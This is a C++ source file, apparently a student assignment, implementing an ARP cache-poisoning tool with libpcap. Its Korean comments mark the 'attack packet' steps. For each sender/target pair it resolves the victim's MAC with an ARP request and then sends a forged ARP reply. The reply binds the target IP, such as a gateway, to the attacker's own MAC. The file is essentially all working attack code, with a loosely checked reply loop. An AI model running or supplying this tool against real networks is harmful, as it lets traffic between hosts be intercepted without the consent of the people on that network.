#include "pch.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> [<sender IP> <target IP> <sender IP> <target IP> ...]\n");
	printf("sample: send-arp-test wlan0 192.168.1.1 192.168.1.3 192.168.1.2 192.168.1.3\n");
}

void getMAC(char *iface, unsigned char *mac) { //MAC주소 받아오기 출처 : chatGPT
        int fd;
        struct ifreq ifr;
        fd = socket(AF_INET, SOCK_DGRAM, 0);
        ifr.ifr_addr.sa_family = AF_INET;
        strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
        ioctl(fd, SIOCGIFHWADDR, &ifr);
        close(fd);
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

int main(int argc, char* argv[]) {
	if (argc < 3 || argc%2==1) {
		usage();
		return -1;
	}
	char victim_mac[18];
	unsigned char mac[6];
    char macStr[18];
	char* iface = argv[1];
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	struct ifreq ifr;
	getMAC(argv[1], mac);
    sprintf(macStr, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    char* my_ip = inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
    close(fd);


    for (int i = 2; i < argc; i += 2){
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(iface, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", iface, errbuf);
			return -1;
		}
		
		// victim에게 arp 요청 보내서 mac 받기 위한 arp 패킷 정의
		EthArpPacket arp_packet;
		arp_packet.eth_.dmac_ = Mac("FF-FF-FF-FF-FF-FF");
		arp_packet.eth_.smac_ = Mac(mac);
		arp_packet.eth_.type_ = htons(EthHdr::Arp);
		arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
		arp_packet.arp_.hln_ = Mac::SIZE;
		arp_packet.arp_.pln_ = Ip::SIZE;
		arp_packet.arp_.op_ = htons(ArpHdr::Request);
		arp_packet.arp_.sip_ = htonl(Ip(my_ip));
		arp_packet.arp_.smac_ = Mac(mac);
		arp_packet.arp_.tmac_ = Mac("00-00-00-00-00-00");
		arp_packet.arp_.tip_ = htonl(Ip(argv[i]));

		//패킷 보내기
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		
		while (true) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			EthArpPacket* reply = (EthArpPacket*)packet;
			strcpy(victim_mac, std::string(reply->arp_.smac_).c_str());
					break;
			}

		//공격 패킷 정의
		arp_packet.eth_.dmac_ = Mac(victim_mac);
		arp_packet.eth_.smac_ = Mac(mac);
		arp_packet.eth_.type_ = htons(EthHdr::Arp);
		arp_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		arp_packet.arp_.pro_ = htons(EthHdr::Ip4);
		arp_packet.arp_.hln_ = Mac::SIZE;
		arp_packet.arp_.pln_ = Ip::SIZE;
		arp_packet.arp_.op_ = htons(ArpHdr::Reply);
		arp_packet.arp_.sip_ = htonl(Ip(argv[i+1]));
		arp_packet.arp_.smac_ = Mac(mac);
		arp_packet.arp_.tmac_ = Mac(victim_mac);
		arp_packet.arp_.tip_ = htonl(Ip(argv[i]));
		//공격 패킷 전송
		int atk = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&arp_packet), sizeof(EthArpPacket));
		if (atk != 0) {
				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", atk, pcap_geterr(handle));
		}	
	
		pcap_close(handle);
	}
}
